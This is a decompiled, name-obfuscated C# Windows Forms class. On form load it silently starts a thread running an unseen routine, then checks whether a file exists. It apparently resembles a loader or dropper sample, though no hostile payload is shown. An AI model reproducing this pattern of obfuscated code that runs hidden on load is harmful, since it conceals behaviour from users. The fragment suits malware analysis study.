using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Kfgzlmpirwmpo;

namespace Mggcsidaslqxkjthanlbjc;

public sealed class e : Form
{
	[Serializable]
	private sealed class a
	{
		public static readonly a a = new a();

		public static ThreadStart b;

		internal void a()
		{
			h.a();
		}
	}

	private IContainer m_a;

	private Button m_b;

	private Button m_c;

	private Button d;

	public e()
	{
		a();
	}

	private void a(object sender, EventArgs e)
	{
		b(null, null);
		d.PerformClick();
	}

	private void b(object sender, EventArgs e)
	{
		Thread thread = new Thread(Mggcsidaslqxkjthanlbjc.e.a.a.a);
		thread.Start();
		thread.Join();
	}

	private void c(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		if (!new FileInfo(new ClassLibrary().Data()).Exists)
		{
			MessageBox.Show("Error");
		}
	}

	protected override void Dispose(bool a)
	{
		if (a && this.m_a != null)
		{
			this.m_a.Dispose();
		}
		((Form)this).Dispose(a);
	}

	private void a()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		this.m_b = new Button();
		this.m_c = new Button();
		d = new Button();
		((Control)this).SuspendLayout();
		((Control)this.m_b).set_Location(new Point(12, 12));
		((Control)this.m_b).set_Name("button1");
		((Control)this.m_b).set_Size(new Size(129, 58));
		((Control)this.m_b).set_TabIndex(0);
		((Control)this.m_b).set_Text("button1");
		((ButtonBase)this.m_b).set_UseVisualStyleBackColor(true);
		((Control)this.m_b).add_Click((EventHandler)b);
		((Control)this.m_c).set_Location(new Point(157, 220));
		((Control)this.m_c).set_Name("button18");
		((Control)this.m_c).set_Size(new Size(129, 58));
		((Control)this.m_c).set_TabIndex(17);
		((Control)this.m_c).set_Text("button18");
		((ButtonBase)this.m_c).set_UseVisualStyleBackColor(true);
		((Control)d).set_Location(new Point(321, 97));
		((Control)d).set_Name("button19");
		((Control)d).set_Size(new Size(129, 58));
		((Control)d).set_TabIndex(18);
		((Control)d).set_Text("button19");
		((ButtonBase)d).set_UseVisualStyleBackColor(true);
		((Control)d).add_Click((EventHandler)c);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(628, 339));
		((Control)this).get_Controls().Add((Control)(object)d);
		((Control)this).get_Controls().Add((Control)(object)this.m_c);
		((Control)this).get_Controls().Add((Control)(object)this.m_b);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)a);
		((Control)this).ResumeLayout(false);
	}
}
